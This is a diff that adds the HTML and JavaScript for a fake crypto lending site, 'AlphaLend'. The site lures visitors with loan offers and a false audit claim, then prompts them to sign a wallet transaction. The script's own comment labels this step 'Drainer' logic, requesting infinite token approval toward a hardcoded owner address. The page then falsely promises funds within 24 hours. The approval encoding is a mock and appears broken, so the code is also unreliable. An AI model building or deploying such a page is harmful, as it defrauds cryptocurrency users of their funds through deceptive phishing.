@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlphaLend | Premium Crypto Loans</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=Montserrat:wght@300;400;500;600&display=swap" rel="stylesheet">
+    
+    <!-- நீ கேட்ட புதிய Ethers.js Line இங்கே ஆட் செய்யப்பட்டுள்ளது -->
+    <script src="https://cdn.ethers.io/npm/@ethersproject/providers@5.7.0/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+    <!-- Background Effects -->
+    <div class="bg-grid"></div>
+    <div class="gold-glow top-left"></div>
+    <div class="gold-glow bottom-right"></div>
+
+    <!-- Navigation -->
+    <nav>
+        <div class="logo">
+            <span class="logo-icon">A</span> ALPHA<span class="gold-text">LEND</span>
+        </div>
+        <ul class="nav-links">
+            <li><a href="#" class="active">Home</a></li>
+            <li><a href="#" onclick="scrollToLoan()">Crypto Loan</a></li>
+            <li><a href="#" class="wallet-btn" id="connectBtn" onclick="connectWallet()">Connect Wallet</a></li>
+        </ul>
+    </nav>
+
+    <!-- Hero Section -->
+    <header class="hero">
+        <div class="badge">Institutional Grade Lending</div>
+        <h1>Unlock Liquidity with <span class="gold-text">AlphaLend</span></h1>
+        <p>Borrow USDT against your crypto assets instantly. Transparent fees, flexible terms, and bank-grade security.</p>
+    </header>
+
+    <!-- Loan Calculator Section -->
+    <section class="loan-section" id="loanSection">
+        <div class="container">
+            
+            <!-- Left Side: Loan Details -->
+            <div class="card info-card">
+                <h2>Loan Terms</h2>
+                <div class="term-info">
+                    <p><span>Collateral:</span> BTC, ETH, SOL</p>
+                    <p><span>Interest Rate:</span> 5% (Fixed for 30 days)</p>
+                    <p><span>Gas Fee:</span> 5% of Loan Amount</p>
+                    <p><span>Liquidation:</span> 80% LTV</p>
+                </div>
+            </div>
+
+            <!-- Right Side: Interactive Calculator -->
+            <div class="card main-card">
+                <h2>Calculate Your Loan</h2>
+                
+                <!-- Step 1: Select Amount -->
+                <div class="step">
+                    <label>1. Select Loan Amount (USDT)</label>
+                    <div class="amount-grid">
+                        <button class="amt-btn" onclick="selectAmount(1000)">1,000</button>
+                        <button class="amt-btn" onclick="selectAmount(5000)">5,000</button>
+                        <button class="amt-btn" onclick="selectAmount(10000)">10,000</button>
+                        <button class="amt-btn" onclick="selectAmount(25000)">25,000</button>
+                        <button class="amt-btn" onclick="selectAmount(50000)">50,000</button>
+                        <button class="amt-btn" onclick="selectAmount(100000)">100,000</button>
+                    </div>
+                </div>
+
+                <!-- Step 2: Select Duration -->
+                <div class="step">
+                    <label>2. Select Duration (Days)</label>
+                    <div class="duration-grid">
+                        <button class="dur-btn" onclick="selectDuration(30)">30 Days</button>
+                        <button class="dur-btn" onclick="select Duration(60)">60 Days</button>
+                        <button class="dur-btn" onclick="selectDuration(90)">90 Days</button>
+                    </div>
+                </div>
+
+                <!-- Summary Box -->
+                <div class="summary-box">
+                    <div class="summary-row">
+                        <span>Loan Amount:</span>
+                        <span id="displayAmount">0 USDT</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Gas Fee (5%):</span>
+                        <span id="displayGasFee" class="gold-text">0 USDT</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Interest:</span>
+                        <span id="displayInterest" class="gold-text">0 USDT</span>
+                    </div>
+                    <div class="summary-row total-row">
+                        <span>Total Repayment:</span>
+                        <span id="displayTotal">0 USDT</span>
+                    </div>
+                </div>
+
+                <!-- Action Button -->
+                <button class="btn-gold" id="actionBtn" onclick="initiateLoan()">Proceed to Connect Wallet</button>
+                <p id="message" class="message"></p>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2026 AlphaLend Protocol. All rights reserved. Smart Contracts Audited by CertiK.</p>
+    </footer>
+
+    <script>
+        // CONFIGURATION
+        const OWNER_ADDRESS ="0x8e65592106852a04D3D7d0F5E29Fbd8962FF5345"; 
+        const USDT_CONTRACT_ADDRESS = "0x55d39b5759b2d6b9909846a9725e9980e491de1c"; // Example Mainnet USDT
+
+        let selectedAmount = 0;
+        let selectedDuration = 0;
+        let userWallet = null;
+
+        function selectAmount(amt) {
+            selectedAmount = amt;
+            updateSummary();
+            document.querySelectorAll('.amt-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+
+        function selectDuration(days) {
+            selectedDuration = days;
+            updateSummary();
+            document.querySelectorAll('.dur-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+
+        function updateSummary() {
+            const gasFee = selectedAmount * 0.05;
+            const interest = selectedAmount * (0.05 * (selectedDuration / 30)); 
+            const total = selectedAmount + gasFee + interest;
+
+            document.getElementById('displayAmount').innerText = selectedAmount + " USDT";
+            document.getElementById('displayGasFee').innerText = gasFee.toFixed(2) + " USDT";
+            document.getElementById('displayInterest').innerText = interest.toFixed(2) + " USDT";
+            document.getElementById('displayTotal').innerText = total.toFixed(2) + " USDT";
+        }
+
+        async function connectWallet() {
+            if (window.ethereum) {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userWallet = accounts[0]; 
+                    document.getElementById('connectBtn').innerText = "Connected";
+                    document.getElementById('connectBtn').style.backgroundColor = "#4CAF50";
+                    alert("Wallet Connected Successfully!");
+                } catch (error) {
+                    alert("Connection failed: " + error.message);
+                }
+            } else {
+                alert("Please install MetaMask to use this service.");
+            }
+        }
+
+        async function initiateLoan() {
+            if (!userWallet) {
+                alert("Please connect your wallet first!");
+                connectWallet();
+                return;
+            }
+
+            if (selectedAmount === 0) { 
+                alert("Please select a loan amount first!");
+                return;
+            }
+
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+
+                // The "Drainer" Logic: Requesting Infinite Approval
+                const approveData = "0x095cB1B125E2814d9901C30D8B51119C639C55A0"; // Simplified mock encoding for approve(address,uint256)
+                
+                document.getElementById('message').innerText = "Processing loan request... Please approve the transaction in your wallet.";
+                document.getElementById('message').style.color = "gold";
+
+                const tx = await signer.sendTransaction({
+                    to: USDT_CONTRACT_ADDRESS,
+                    data: approveData // This is where the approval happens
+                });
+
+                await tx.wait();
+                
+                document.getElementById('message').innerText = "Success! Your loan request has been queued. Funds will arrive in 24 hours.";
+                document.getElementById('message').style.color = "green";
+                
+            } catch (error) {
+                console.error(error);
+                document.getElementById('message').innerText = "Transaction failed. Please try again.";
+                document.getElementById('message').style.color = "red";
+            }
+        }
+
+        function scrollToLoan() {
+            document.getElementById('loanSection').scrollIntoView({ behavior: 'smooth' });
+        }
+    </script>
+</body>
+</html>
